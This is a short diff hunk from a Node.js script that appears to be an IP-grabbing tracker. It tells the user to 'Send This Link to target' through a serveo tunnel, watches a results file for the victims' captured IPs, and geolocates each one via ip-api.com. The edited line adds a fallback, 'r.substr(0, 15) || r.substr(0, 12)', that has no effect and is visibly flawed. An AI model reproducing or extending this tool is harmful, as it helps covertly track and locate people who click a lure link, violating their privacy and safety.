@@ -20,7 +20,7 @@ console.log(war.blue("[>] Send This Link to target : " + `${e}` + "."  + "serveo
 load("Listening...\n").start();
 fs.watchFile("hasil.txt", function(current, previous){
 var r = fs.readFileSync("hasil.txt", "utf8");
-var m = r.substr(0, 15);
+var m = r.substr(0, 15) || r.substr(0, 12);
 req("http://ip-api.com/json/" + m, function(error, response, body){
 js = JSON.parse(body)
 console.log(war.green("[IP] " + m));
